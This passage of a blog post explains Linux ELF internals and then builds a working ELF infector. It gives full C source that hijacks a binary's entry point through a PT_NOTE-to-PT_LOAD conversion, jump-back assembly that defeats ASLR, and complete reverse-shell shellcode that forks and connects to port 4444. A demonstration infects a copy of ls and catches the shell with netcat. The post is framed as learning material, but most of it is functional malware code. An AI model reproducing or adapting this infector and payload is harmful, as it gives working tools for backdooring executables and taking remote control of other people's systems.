Elf64_Word; typedef int32_t Elf64_Sword; /* Types for signed and unsigned 64-bit quantities. */ typedef uint64_t Elf32_Xword; typedef int64_t Elf32_Sxword; typedef uint64_t Elf64_Xword; typedef int64_t Elf64_Sxword; /* Type of addresses. */ typedef uint32_t Elf32_Addr; typedef uint64_t Elf64_Addr; /* Type of file offsets. */ typedef uint32_t Elf32_Off; typedef uint64_t Elf64_Off; /* Type for section indices, which are 16-bit quantities. */ typedef uint16_t Elf32_Section; typedef uint16_t Elf64_Section; /* Type for version symbol information. */ typedef Elf32_Half Elf32_Versym; typedef Elf64_Half Elf64_Versym; If we want to see the PT_NOTE or SHT_NOTE segments of ELF binaries for ourselves, we can glean them using the readelf utility with the -n or --notes flag.\n$ readelf -n /usr/bin/ls Displaying notes found in: .note.gnu.property Owner Data size Description GNU 0x00000020 NT_GNU_PROPERTY_TYPE_0 Properties: x86 feature: IBT, SHSTK x86 ISA needed: x86-64-baseline Displaying notes found in: .note.gnu.build-id Owner Data size Description GNU 0x00000014 NT_GNU_BUILD_ID (unique build ID bitstring) Build ID: 3eca7e3905b37d48cf0a88b576faa7b95cc3097b Displaying notes found in: .note.ABI-tag Owner Data size Description GNU 0x00000010 NT_GNU_ABI_TAG (ABI version tag) OS: Linux, ABI: 3.2.0 Constructing an Infector Now that we have an idea about how ELF files are structured and operate, we can further clarify our objectives. What do we want to do? First we want to read and write.\nBut before we can do so, we need to set some declarations based on the ELF structures to help us construct our gadgets:\nElf64_Ehdr* read_elf64_header(int fd); Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum); int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs); int write_elf64_header(int fd, Elf64_Ehdr *header); unsigned char* read_file(const char *filename, size_t *length); void write_u64_le(unsigned char *dest, uint64_t val); void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t start_offset); We want to open and read both an ELF binary and a shellcode file to some allocated memory buffers. Our main function:\nint main(int argc, char **argv) { if (argc != 3) { fprintf(stderr, \u0026#34;Usage: %s \u0026lt;ELF File\u0026gt; \u0026lt;Shellcode File\u0026gt;\\n\u0026#34;, argv[0]); exit(1); } const char *elf_path = argv[1]; const char *bin_path = argv[2]; // Open ELF file with RW permissions int elf_fd = open(elf_path, O_RDWR); if (elf_fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Error opening ELF file \u0026#39;%s\u0026#39;: %s\\n\u0026#34;, elf_path, strerror(errno)); exit(1); } // Load shellcode from file size_t shellcode_len = 0; unsigned char *shellcode = read_file(bin_path, \u0026amp;shellcode_len); if (shellcode == NULL) { fprintf(stderr, \u0026#34;Error reading shellcode file \u0026#39;%s\u0026#39;\\n\u0026#34;, bin_path); close(elf_fd); exit(1); } // Parse ELF and program headers Elf64_Ehdr *elf_header = read_elf64_header(elf_fd); if (elf_header == NULL) { fprintf(stderr, \u0026#34;Error reading ELF header\\n\u0026#34;); close(elf_fd); free(shellcode); exit(1); } Elf64_Phdr *program_headers = read_elf64_program_headers(elf_fd, elf_header-\u0026gt;e_phoff, elf_header-\u0026gt;e_phnum); if (program_headers == NULL) { fprintf(stderr, \u0026#34;Error reading program headers\\n\u0026#34;); close(elf_fd); free(elf_header); free(shellcode); exit(1); } // snipped We first call out to our read_file function to get our shellcode. Once inside, we give fopen our filename and SEEK to the end of the file to get its size with ftell.\nWe call malloc against our file size to allocate a buffer, then call fread to read the file into the newly allocated buffer. If the function doesn\u0026rsquo;t error out, we return a pointer to the buffer.\n// Read entire contents of a file into a dynamically allocated buffer // File length is stored in *length // Return pointer to buffer on success, or NULL on failure unsigned char* read_file(const char *filename, size_t *length) { FILE *fp = fopen(filename, \u0026#34;rb\u0026#34;); if (fp == NULL) { fprintf(stderr, \u0026#34;Error opening file \u0026#39;%s\u0026#39;: %s\\n\u0026#34;, filename, strerror(errno)); return NULL; } if (fseek(fp, 0, SEEK_END) != 0) { fprintf(stderr, \u0026#34;Error seeking in file \u0026#39;%s\u0026#39;\\n\u0026#34;, filename); fclose(fp); return NULL; } long file_size = ftell(fp); if (file_size \u0026lt; 0) { fprintf(stderr, \u0026#34;Error getting file size for \u0026#39;%s\u0026#39;\\n\u0026#34;, filename); fclose(fp); return NULL; } rewind(fp); unsigned char *buffer = malloc(file_size); if (buffer == NULL) { fprintf(stderr, \u0026#34;Error allocating memory for file \u0026#39;%s\u0026#39;\\n\u0026#34;, filename); fclose(fp); return NULL; } size_t read_size = fread(buffer, 1, file_size, fp); if (read_size != (size_t)file_size) { fprintf(stderr, \u0026#34;Error reading file \u0026#39;%s\u0026#39;\\n\u0026#34;, filename); free(buffer); fclose(fp); return NULL; } fclose(fp); *length = read_size; return buffer; } After returning from our call to read_file to get the shellcode buffer, we\u0026rsquo;re ready to call our ELF helper functions to parse both the ELF header and its program headers.\nWe use lseek and SEEK_SET to get an offset to the beginning of the ELF header and allocate it to memory with malloc. Then we get the program headers.\nThe resulting size of the array of program headers is the size of the ELF64_Phdr times the number of program headers phnum:\n// Read the ELF64 header from the given file descriptor // Return a pointer to an allocated Elf64_Ehdr structure on success, or NULL on failure Elf64_Ehdr* read_elf64_header(int fd) { if (lseek(fd, 0, SEEK_SET) \u0026lt; 0) { fprintf(stderr, \u0026#34;Error seeking to beginning of ELF file\\n\u0026#34;); return NULL; } Elf64_Ehdr *header = malloc(sizeof(Elf64_Ehdr)); if (header == NULL) { fprintf(stderr, \u0026#34;Error allocating memory for ELF header\\n\u0026#34;); return NULL; } if (read(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) { fprintf(stderr, \u0026#34;Error reading ELF header\\n\u0026#34;); free(header); return NULL; } return header; } // Read ELF64 program headers from the given file descriptor at offset phoff // expecting phnum headers // Return a pointer to an allocated array of program headers // or NULL on failure Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum) { if (lseek(fd, phoff, SEEK_SET) \u0026lt; 0) { fprintf(stderr, \u0026#34;Error seeking to program headers offset\\n\u0026#34;); return NULL; } Elf64_Phdr *phdrs = malloc(sizeof(Elf64_Phdr) * phnum); if (phdrs == NULL) { fprintf(stderr, \u0026#34;Error allocating memory for program headers\\n\u0026#34;); return NULL; } size_t total_size = sizeof(Elf64_Phdr) * phnum; if (read(fd, phdrs, total_size) != (ssize_t)total_size) { fprintf(stderr, \u0026#34;Error reading program headers from ELF file\\n\u0026#34;); free(phdrs); return NULL; } return phdrs; } After we\u0026rsquo;ve read both our shellcode file and our ELF headers, allocating them to memory with malloc \u0026ndash; we land back in main function once more.\nNow we do a few important things. First we store the original e_entry from the ELF header in original entry. We need this later.\nThen we get the file size of the target ELF binary with stat by accessing st_size. We save this physical file size offset in file_offset.\nThen we generate a memory_offset using a high address by adding 0xc00000000 to our file_offset. This memory_offset is the virtual addressing where we want to load our shellcode to when our ELF file gets mapped. The high addressing ensures our shellcode will be mapped far away from any of the other data. And it\u0026rsquo;s where we\u0026rsquo;re going to point e_entry.\nThen we alter the PT_NOTE into a PT_LOAD segment. We give it read and execute permissions. We set the p_offset field to our file_offset and our virtual memory address to the memory_offset.\nThen we adjust the p_memsz and p_filesz fields, incrementing them by the length of our shellcode \u0026ndash; making room for it in the virtual file image mapping. And last, we patch the entry of the ELF header to point to our memory_offset where our malware will be mapped to.\n// Save the old entry point so we can jump later uint64_t original_entry = elf_header-\u0026gt;e_entry; uint64_t sc_len = (uint64_t)shellcode_len; // Calculate offsets for patching the ELF and program headers struct stat st; if (fstat(elf_fd, \u0026amp;st) != 0) { fprintf(stderr, \u0026#34;Error getting ELF file metadata: %s\\n\u0026#34;, strerror(errno)); close(elf_fd); free(elf_header); free(program_headers); free(shellcode); exit(1); } uint64_t file_offset = st.st_size; uint64_t memory_offset = 0xc00000000ULL + file_offset; // Look for PT_NOTE section for (int i = 0; i \u0026lt; elf_header-\u0026gt;e_phnum; i++) { if (program_headers[i].p_type == PT_NOTE) { // Convert to a PT_LOAD section with values to load shellcode printf(\u0026#34;[+] Found PT_NOTE section\\n\u0026#34;); printf(\u0026#34;[+] Changing to PT_LOAD\\n\u0026#34;); program_headers[i].p_type = PT_LOAD; program_headers[i].p_flags = PF_R | PF_X; program_headers[i].p_offset = file_offset; program_headers[i].p_vaddr = memory_offset; program_headers[i].p_memsz += sc_len; program_headers[i].p_filesz += sc_len; // Patch the ELF header to start at the shellcode elf_header-\u0026gt;e_entry = memory_offset; printf(\u0026#34;[+] Patched e_entry\\n\u0026#34;); break; } } // Patch shellcode to jump to the original entry point after finishing patch(\u0026amp;shellcode, \u0026amp;shellcode_len, elf_header-\u0026gt;e_entry, original_entry); A few remarks about what\u0026rsquo;s going on here, exactly:\np_type = PT_LOAD; // Set PT_LOAD flag p_flags = PF_R | PF_X; // Set read and execute permissions p_offset = file_offset; // Set p_offset to the file_offset. The file_offset // is the size of the original ELF binary. // And what\u0026#39;s at the *end* of our ELF? // The shellcode we append. p_vaddr = memory_offset; // The virtual address offset we want to map our // shellcode to. Equivalent to the file size // offset but at a higher address range, e.g. // 0xc00000000 p_memsz += sc_len; // Increase the number of bytes in the file // image of the segment by the length of // the shellcode p_filesz += sc_len; // Increase the number of bytes in the memory // image of the segment by the length of the // shellcode Lastly, use assign elf_header-\u0026gt;e_entry = memory_offset, modifying the ELF entry to point to our memory offset where our shellcode will reside when it\u0026rsquo;s loaded.\nAnd Patch Me Up The next step is really important to understand. This is where we call our very helpful patch function.\n// Patch shellcode to jump to the original entry point after finishing patch(\u0026amp;shellcode, \u0026amp;shellcode_len, elf_header-\u0026gt;e_entry, original_entry); And once inside, there\u0026rsquo;s an additional array of shellcode called jump_shellcode. We patch this array with the values we pass to the patch function.\nWe then modify the original shellcode buffer from earlier \u0026ndash; extending it by the size of the additional jump_shellcode array.\nAfter our original shellcode array is extended by the size of the jump_shellcode array, we memcpy the additional patched jump_shellcode into the extended shellcode buffer space, aka at the end of our malware code. And finally we update our shellcode buffer and length pointers to our new updated shellcode buffer and length pointers.\n// Patch in shellcode from jumpstart.s to resolve original_entry point void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t original_entry) { unsigned char jump_shellcode[] = { 0xe8, 0x2d, 0x00, 0x00, 0x00, 0x49, 0xb9, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde, 0x49, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x49, 0xbb, 0xb5, 0x00, 0x6b, 0xb1, 0xb5, 0x00, 0x6b, 0xb1, 0x4c, 0x29, 0xc8, 0x48, 0x83, 0xe8, 0x05, 0x4c, 0x29, 0xd0, 0x4c, 0x01, 0xd8, 0xff, 0xe0, 0x48, 0x8b, 0x04, 0x24, 0xc3 }; // Write values using little-endian ordering write_u64_le(\u0026amp;jump_shellcode[7], (uint64_t)(*shellcode_len)); write_u64_le(\u0026amp;jump_shellcode[17], entry_point); write_u64_le(\u0026amp;jump_shellcode[27], original_entry); // Extend shellcode vector by appending the jump_shellcode size; // Realloc new size, memcpy jump_shellcode into extended space size_t new_len = *shellcode_len + sizeof(jump_shellcode); unsigned char *new_shellcode = realloc(*shellcode, new_len); if (new_shellcode == NULL) { fprintf(stderr, \u0026#34;Error reallocating shellcode buffer\\n\u0026#34;); free(*shellcode); exit(1); } memcpy(new_shellcode + *shellcode_len, jump_shellcode, sizeof(jump_shellcode)); *shellcode = new_shellcode; *shellcode_len = new_len; } Our shellcode length, aka VSIZE, is stored starting at byte 8. Our entry point, aka ENTRY, is stored at byte 17. Our original entry, aka START is stored at byte 27.\nSee, the constants we define in the assembly \u0026ndash; which we use to generate the jump shellcode \u0026ndash; are merely placeholders. The values in the jump_shellcode array are being overwritten with our values \u0026ndash; our shellcode length, entry point, and original entry.\nAfter the patch function completes, we go back to the main function where we write all of this back to the target ELF \u0026ndash; appending our shellcode to the end of the binary by calling SEEK_END on our ELF file descriptor \u0026ndash; and using our write gadgets to write back the altered program headers to the ELF file.\nBelow is the assembly code of the jump_shellcode array. If it doesn\u0026rsquo;t make sense yet, I\u0026rsquo;ll try to explain below.\nBITS 64 %define VSIZE 0xDEADBEEFDEADBEEF %define ENTRY 0xBAADF00DBAADF00D %define START 0xB16B00B5B16B00B5 ; - position independent executables move addresses, so ; 1) call to get_foo instruction pointer into rax then ; 2) load our constants into registers r9, r10, r11 ; 3) subtract our malware size, (\u0026amp; subtract 5!) ; *(the size of the get_foo instruction) ; 4) subtract patched entry offset from rax ; 5) add our original entry point to r11 ; 6) finally jmp to rax call get_foo mov r9, VSIZE mov r10, ENTRY mov r11, START sub rax, r9 sub rax, 5 sub rax, r10 add rax, r11 jmp rax get_foo: mov rax, [rsp] ret Why do we need the patch? Modern ELF binaries are often built to use ASLR and therefore tend to be position independent executables. That is to say, each time an ELF file runs, its address layout is semi-randomized and loaded into a different memory space.12 It achieves this by implementing a random base address.\nThis means we can\u0026rsquo;t just hardcode a return address to go to after our malware executes. And instead, we rely on this one weird trick we append to the end of our malware code to help us jump back to the original entry point.13\nThe constants end up representing our malware shellcode size, our memory_offset (the new e_entry), and the original entry point that we\nWith our bytes now patched into this mini program, the logic of the assembly code works like this. Think about it.\nAfter our malware has executed, we slide into the jump_shellcode. We first call get_foo and store the stack pointer in rax and then return.\nWe then move our constants \u0026ndash; the malware shellcode size, patched entry, and the original start address, to registers r9, r10, and r11.\nThen we do the following trick. You can visualize this pretty clearly. Remember, after our virus has executed, we are currently at the end of the malware shellcode, where we enter the additional jump_shellcode array. So, in order to find out where we are, we have to work backwards.\nSo first we substract the size of our malware shellcode VSIZE from the stack pointer in rax. Then we subtract 5 to adjust for the size of the get_foo instruction itself.\nAt this point in time, the stack pointer is now effectively back at the patched ENTRY offset. But we want to get to the original START entry point. So we substract the ENTRY offset, extracting the base randomization!\nAnd now we add back the original entry point START we stored in r11 to rax. That is, rax now contains the original entry point so we can call jmp rax, landing into the ELF\u0026rsquo;s original entry point and preserving the program\u0026rsquo;s host behavior \u0026ndash; every time \u0026ndash; even though the executable is position independent.\nWith our jump_shellcode appended to our original shellcode, we write all of the alterations back to the ELF binary:\n// Append shellcode to the very end of the target ELF if (lseek(elf_fd, 0, SEEK_END) \u0026lt; 0) { fprintf(stderr, \u0026#34;Error seeking to end of ELF file: %s\\n\u0026#34;, strerror(errno)); close(elf_fd); free(elf_header); free(program_headers); free(shellcode); exit(1); } if (write(elf_fd, shellcode, shellcode_len) != (ssize_t)shellcode_len) { fprintf(stderr, \u0026#34;Error writing shellcode to ELF file\\n\u0026#34;); close(elf_fd); free(elf_header); free(program_headers); free(shellcode); exit(1); } //snipped // Write the ELF64 program headers to the file at offset phoff // Return 0 on success, or non-zero on failure int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs) { if (lseek(fd, phoff, SEEK_SET) \u0026lt; 0) { fprintf(stderr, \u0026#34;Error seeking to program headers offset for writing\\n\u0026#34;); return 1; } size_t total_size = sizeof(Elf64_Phdr) * phnum; if (write(fd, phdrs, total_size) != (ssize_t)total_size) { fprintf(stderr, \u0026#34;Error writing program headers to ELF file\\n\u0026#34;); return 1; } return 0; } // Write the ELF64 header to the beginning of the file // Return 0 on success, or non-zero on failure int write_elf64_header(int fd, Elf64_Ehdr *header) { if (lseek(fd, 0, SEEK_SET) \u0026lt; 0) { fprintf(stderr, \u0026#34;Error seeking to beginning of ELF file for header writing\\n\u0026#34;); return 1; } if (write(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) { fprintf(stderr, \u0026#34;Error writing ELF header to file\\n\u0026#34;); return 1; } return 0; } Assembling a Payload Embarrassingly, it took me a little while to get a reliable payload working. Initially, my program would segfault and I thought I messed up the infector. At another point, it would segfault while the shell would survive. And as I got closer, it would sometimes almost work\u0026ndash;but yet still segfault.\n$ ./ls Segmentation fault (core dumped) $ ./ls Segmentation fault (core dumped) $ ./ls elf_infector maybe maybe2 maybe3.s maybe4.s maybe5.s maybe6.s maybe7.s maybe8.s ls maybe.s maybe2.s maybe4 maybe5 maybe6 maybe7 maybe8 Segmentation fault (core dumped) $ ./ls elf_infector maybe maybe2 maybe3.s maybe4.s maybe5.s maybe6.s maybe7.s maybe8.s ls maybe.s maybe2.s maybe4 maybe5 maybe6 maybe7 maybe8 Segmentation fault (core dumped) $ ./ls Segmentation fault (core dumped) $ ./ls elf_infector maybe maybe2 maybe3.s maybe4.s maybe5.s maybe6.s maybe7.s maybe8.s ls maybe.s maybe2.s maybe4 maybe5 maybe6 maybe7 maybe8 Segmentation fault (core dumped) (╯°□°）╯︵ ┻━┻ One issue was the way that I originally ordered the logic of the fork in my payload code. Initially I tried to jump into the fork. And then I accidentally mucked up the stack. But then I realized that you could just spawn it and return to the parent process pretty easily.\nThe other issues were with ret sometimes messing up the stack alignment. If you call ret at the end, during the return to the parent process, it messes up the stack.\nEventually, I realized that the answer to all of this was a lot more straight forward and that my approach to using fork to spawn a process in the background was feasible and could be improved. And that the stack could in fact be preserved and restored in a reliable way.\nAfter a bit of trial and error \u0026ndash; and remembering to correctly return the stack pointer \u0026ndash; the shellcode seems reliable now. In the end, the stable assembly code I ended up creating goes something like this:\nFirst, we try to preserve the behavior of the infected host binary by saving all of the registers by pushing them to the stack, along with the stack pointer.\nOnly then do we try to call the fork syscall. The child_process then spawns off where it prepares its networking code.\nInside the forked child_process, we prepare to use the socket syscall by setting up the AF_INET, SOCK_STREAM, and IPPROTOC_TCP arguments.\nIf the socket setup fails, our child_process \u0026ndash; now separated from the parent \u0026ndash; fails silently. Otherwise, we likely have a good file descriptor and so we move it to rdi.\nContinuing, we prepare to use the connect syscall. First we xor the rdx register clearing it before pushing it to the stack as a NULL pad, before pushing the address we want to connect to. Here, we just use localhost, 127.0.0.1, and our chosen port 4444.\nWe push the AF_INET (address family) 2, then move the stack pointer to rsi for the sockaddr pointer and set it to its correct structure size of 16 bytes.\nWe make the connect syscall which uses the previously mentioned bits along with our file descriptor in rdi, and if it fails, we exit gracefully. Otherwise, we setup to duplicate the file descriptor with dup2 and move on to execute our shell.\n\u0026ldquo;dup2 doesn\u0026rsquo;t switch the file descriptors, it makes them equivalent. After dup2(f1, 0), whatever file was opened on descriptor f1 is now also opened (with the same mode and position) on descriptor 0, i.e. on standard input.\nIf the target file descriptor was open, it is closed by the dup2 call. This is useful (among other things) when you have part of a program that reads or write from the standard file descriptors. For example, suppose that somefunc() reads from standard input, but you want it to read from a different file from where the rest of the program is getting its standard input. Then you can do (error checking omitted):\u0026rdquo;\nint save_stdin = dup(0); int somefunc_input_fd = open(\u0026#34;input-for-somefunc.data\u0026#34;, O_RDONLY); dup2(somefunc_input_fd, 0); /* Now the original stdin is open on save_stdin, and input-for-somefunc.data on both somefunc_input_fd and 0. */ somefunc(); close(somefunc_input_fd); dup2(save_stdin, 0); close(save_stdin); This useful insight brought to you by netizen \u0026ldquo;Gilles \u0026lsquo;SO- stop being evil\u0026rsquo;\u0026rdquo; of StackOverflow\nDup2 lets us duplicate the file descriptor to handle stdin, stdout, and stderr pipes. After we decrement through the dup2_loop, we can use them with a shell.\nSo we build the /bin/sh pathname array and move it to rbx, followed by the path to the argument of the pathname!\nOur final code looks like this, with execve(\u0026quot;/bin/sh\u0026quot;, [\u0026quot;/bin/sh\u0026quot;], NULL). If all goes well, we receive a shell on our listener and the original behavior of our infected host program is preserved.\nBITS 64 global _start section .text _start: ; save original stack pointer mov r12, rsp ; preserve rsp in r12 ; save all registers push rax push rbx push rcx push rdx push rsi push rdi push rbp push r8 push r9 push r10 push r11 ; fork to isolate shellcode execution mov rax, 57 ; sys_fork syscall test rax, rax jnz parent ; parent continues host execution child_process: ; socket syscall ; int socket(int domain, int type, int protocol) mov rax, 41 ; sys_socket mov rdi, 2 ; AF_INET mov rsi, 1 ; SOCK_STREAM mov rdx, 6 ; IPPROTO_TCP syscall cmp rax, 0 jl exit ; if socket fails, exit ; save socket file descriptor in rdi mov rdi, rax ; connect syscall ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) mov rax, 42 ; sys_connect ; build sockaddr_in structure on the stack xor rdx, rdx push rdx ; null pad push dword 0x0100007f ; 127.0.0.1, ip address push word 0x5c11 ; port 4444, network byte order push word 2 ; AF_INET mov rsi, rsp ; pointer to sockaddr_in structure mov rdx, 16 ; size of sockaddr_in syscall cmp rax, 0 jl exit ; if connect fails, exit ; dup2 syscall: int dup2(int oldfd, int newfd) mov rsi, 3 ; Start with stderr (2), work down to stdin (0) dup2_loop: dec rsi ; Decrement file descriptor (2 -\u0026gt; 1 -\u0026gt; 0) mov rax, 33 ; sys_dup2 syscall jnz dup2_loop ; loop until rsi is 0 ; execve syscall ; int execve(const char *pathname, char *const argv[], char *const envp[]) xor rax, rax push rax ; NULL terminator mov rbx, 0x68732f6e69622f2f ; \u0026#34;//bin/sh\u0026#34; in reverse byte order push rbx mov rdi, rsp ; Pathname pointer push rax ; NULL terminator for argv push rdi ; pointer to the string \u0026#34;//bin/sh\u0026#34; mov rsi, rsp ; argv -\u0026gt; [pointer_to_string, NULL] xor rdx, rdx ; envp -\u0026gt;NULL mov al, 59 ; syscall, execve syscall ; if execve fails, exit exit: xor rax, rax mov al, 60 ; sys_exit xor rdi, rdi syscall parent: ; restore registers and continue host execution pop r11 pop r10 pop r9 pop r8 pop rbp pop rdi pop rsi pop rdx pop rcx pop rbx pop rax mov rsp, r12 ; restore stack pointer The last thing we do in order to ensure our exploit runs and lands smoothly is to pop all of our registers back in the proper reverse order that we pushed them \u0026ndash; and then move the stack pointer we saved earlier in r12 back to rsp.\nProof of Concept $ gcc -o elf_infector elf_infector.c $ cp $(which ls) ls $ nasm -o shellcode shellcode.s $ ./elf_infector ./ls shellcode [+] Found PT_NOTE section [+] Changing to PT_LOAD [+] Patched e_entry $ ./ls elf_infector elf_infector.c ls shellcode shellcode.s Meanwhile\u0026hellip; in our other console:\n$ nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 127.0.0.1 51020 cat /etc/issue Ubuntu 24.04.2 LTS \\n \\l uname -a Linux vr 6.8.0-53-generic #55-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 17 15:37:52 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux ELF Infector on Github.\nV2 You might have noticed a possible discrepancy in the core functionality of our program where we modify the program headers. We added the sc_len derived from our shellcode_len value to the p_filesz and p_memsz to make room for our shellcode.\nIn that scenario, we called the patch function afterward, which modifies both the shellcode_len and shellcode buffer, extending them both before pointing them to a new shellcode buffer and length. And afterward, we then write it back to the ELF file.\nBut the ELF segment modififications we specified before in the PT_LOAD segment \u0026ndash; p_filesz and p_memsz \u0026ndash; still have the old shellcode length.\nLuckily, memory from p_filesz through p_memsz actually gets rounded up to the next page size for alignment purposes. So our patched shellcode still runs even though we didn\u0026rsquo;t specify the new length when manipulating the PT_LOAD fields.\n/* * Map \u0026#34;eppnt-\u0026gt;p_filesz\u0026#34; bytes from \u0026#34;filep\u0026#34; offset \u0026#34;eppnt-\u0026gt;p_offset\u0026#34; * into memory at \u0026#34;addr\u0026#34;. (Note that p_filesz is rounded up to the * next page, so any extra bytes from the file must be wiped.) */ static unsigned long elf_map(struct file *filep, unsigned long addr, const struct elf_phdr *eppnt, int prot, int type, unsigned long total_size) { unsigned long map_addr; unsigned long size = eppnt-\u0026gt;p_filesz + ELF_PAGEOFFSET(eppnt-\u0026gt;p_vaddr); unsigned long off = eppnt-\u0026gt;p_offset - ELF_PAGEOFFSET(eppnt-\u0026gt;p_vaddr); addr = ELF_PAGESTART(addr); size = ELF_PAGEALIGN(size); /* mmap() will return -EINVAL if given a zero size, but a * segment with zero filesize is perfectly valid */ if (!size) return addr; /* * total_size is the size of the ELF (interpreter) image. * The _first_ mmap needs to know the full size, otherwise * randomization might put this image into an overlapping * position with the ELF binary image. (since size \u0026lt; total_size) * So we first map the \u0026#39;big\u0026#39; image - and unmap the remainder at * the end. (which unmap is needed for ELF images with holes.) */ if (total_size) { total_size = ELF_PAGEALIGN(total_size); map_addr = vm_mmap(filep, addr, total_size, prot, type, off); if (!BAD_ADDR(map_addr)) vm_munmap(map_addr+size, total_size-size); } else map_addr = vm_mmap(filep, addr, size, prot, type, off); if ((type \u0026amp; MAP_FIXED_NOREPLACE) \u0026amp;\u0026amp; PTR_ERR((void *)map_addr) == -EEXIST) pr_info(\u0026#34;%d (%s): Uhuuh, elf segment at %px requested but the memory is mapped already\\n\u0026#34;, task_pid_nr(current), current-\u0026gt;comm, (void *)addr); return(map_addr); } And:\n/* * Map \u0026#34;eppnt-\u0026gt;p_filesz\u0026#34; bytes from \u0026#34;filep\u0026#34; offset \u0026#34;eppnt-\u0026gt;p_offset\u0026#34; * into memory at \u0026#34;addr\u0026#34;. Memory from \u0026#34;p_filesz\u0026#34; through \u0026#34;p_memsz\u0026#34; * rounded up to the next page is zeroed. */ static unsigned long elf_load(struct file *filep, unsigned long addr, const struct elf_phdr *eppnt, int prot, int type, unsigned long total_size) { unsigned long zero_start, zero_end; unsigned long map_addr; if (eppnt-\u0026gt;p_filesz) { map_addr = elf_map(filep, addr, eppnt, prot, type, total_size); if (BAD_ADDR(map_addr)) return map_addr; if (eppnt-\u0026gt;p_memsz \u0026gt; eppnt-\u0026gt;p_filesz) { zero_start = map_addr + ELF_PAGEOFFSET(eppnt-\u0026gt;p_vaddr) + eppnt-\u0026gt;p_filesz; zero_end = map_addr + ELF_PAGEOFFSET(eppnt-\u0026gt;p_vaddr) + eppnt-\u0026gt;p_memsz; /* * Zero the end of the last mapped page but ignore * any errors if the segment isn\u0026#39;t writable. */ if (padzero(zero_start) \u0026amp;\u0026amp; (prot \u0026amp; PROT_WRITE)) return -EFAULT; } } else { map_addr = zero_start = ELF_PAGESTART(addr); zero_end = zero_start + ELF_PAGEOFFSET(eppnt-\u0026gt;p_vaddr) + eppnt-\u0026gt;p_memsz; } if (eppnt-\u0026gt;p_memsz \u0026gt; eppnt-\u0026gt;p_filesz) { /* * Map the last of the segment. * If the header is requesting these pages to be * executable, honour that (ppc32 needs this). */ int error; zero_start = ELF_PAGEALIGN(zero_start); zero_end = ELF_PAGEALIGN(zero_end); error = vm_brk_flags(zero_start, zero_end - zero_start, prot \u0026amp; PROT_EXEC ? VM_EXEC : 0); if (error) map_addr = error; } return map_addr; } Our original proof of concept works fine. But we can rewrite the logic like this, calling the patch function first, getting the updated shellcode length before modifying p_filesz and p_memsz. I mean, if we were going to be pedantic about it.\n// Patch shellcode to jump to the original entry point after finishing // // We\u0026#39;ll be setting e_entry to memory_offset, so we we\u0026#39;ll pass it // ahead of time to the patch function patch(\u0026amp;shellcode, \u0026amp;shellcode_len, memory_offset, original_entry); // After the patch function executes, our shellcode length and buffer // are different. Update sc_len to the patched length to be pedantic // uint64_t sc_len = (uint64_t)shellcode_len; // Look for PT_NOTE section for (int i = 0; i \u0026lt; elf_header-\u0026gt;e_phnum; i++) { if (program_headers[i].p_type == PT_NOTE) { // Convert to a PT_LOAD section with values to load shellcode printf(\u0026#34;[+] Found PT_NOTE section\\n\u0026#34;); printf(\u0026#34;[+] Changing to PT_LOAD\\n\u0026#34;); program_headers[i].p_type = PT_LOAD; program_headers[i].p_flags = PF_R | PF_X; program_headers[i].p_offset = file_offset; program_headers[i].p_vaddr = memory_offset; program_headers[i].p_memsz += sc_len; program_headers[i].p_filesz += sc_len; // Patch the ELF header to start at the shellcode elf_header-\u0026gt;e_entry = memory_offset; printf(\u0026#34;[+] Patched e_entry\\n\u0026#34;); break; } } https://github.com/torvalds/linux/blob/master/include/uapi/linux/elf.h#L226\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://man7.org/linux/man-pages/man5/elf.5.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://docs.oracle.com/cd/E19683-01/817-3677/chapter6-83432/index.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L362\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://man7.org/linux/man-pages/man2/execve.2.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://man7.org/linux/man-pages/man2/brk.2.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://stackoverflow.com/questions/6988487/what-does-the-brk-system-call-do\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://elixir.bootlin.com/linux/v6.13.4/source/fs/binfmt_elf.c#L734\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://docs.oracle.com/cd/E19683-01/816-1386/6m7qcobkp/index.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://elixir.bootlin.com/glibc/glibc-2.1/source/elf/rtld.c\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://docs.oracle.com/cd/E19683-01/816-1386/chapter6-83432/index.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n\u0026ldquo;Note on resolving Elf_Hdr-\u0026gt;e_entry in PIE executables.\u0026rdquo; https://archive.org/details/pocorgtfo20/page/n49/mode/1up\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://hexagram.foo/posts/infecting-linux-elf-files/","summary":"\u003ch2 id=\"elfland\"\u003eElfland\u003c/h2\u003e\n\u003cp\u003eLately I\u0026rsquo;ve been thinking about Linux internals and malware. In this blog post, we\u0026rsquo;re going to hark about the ELFs. Just as Windows has its own \u003ca href=\"https://www.stephan.onl/2023/08/portable-executable-format-and.html\"\u003eexecutable format\u003c/a\u003e, so too does 